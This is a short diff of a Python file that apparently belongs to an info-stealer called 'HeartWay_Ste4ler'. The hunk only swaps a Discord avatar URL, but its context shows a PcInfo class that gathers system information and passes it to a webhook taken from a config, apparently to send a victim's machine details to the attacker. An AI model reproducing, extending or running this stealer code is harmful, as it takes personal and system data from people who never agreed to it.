@@ -6,7 +6,7 @@ import subprocess
 
 class PcInfo:
     def __init__(self):
-        self.avatar = "https://media.discordapp.net/attachments/1271668100856676352/1279105898652106865/r900x900r.png?ex=66d33bb2&is=66d1ea32&hm=cddf4907a26ede1216b8e0b1058c903cfb072920f74a8439bb036c07c03eab22&=&format=webp&quality=lossless&width=662&height=662"
+        self.avatar = "https://media.discordapp.net/attachments/1271668100856676352/1279105898652106865/r900x900r.png?ex=66db24b2&is=66d9d332&hm=86a3e227a5fc2d12334ec7215101d8da534cccec4b910c4efb92272cdc164774&=&format=webp&quality=lossless&width=662&height=662"
         self.username = "HeartWay_Ste4ler"
         self.get_system_info(__CONFIG__["webhook"])
 
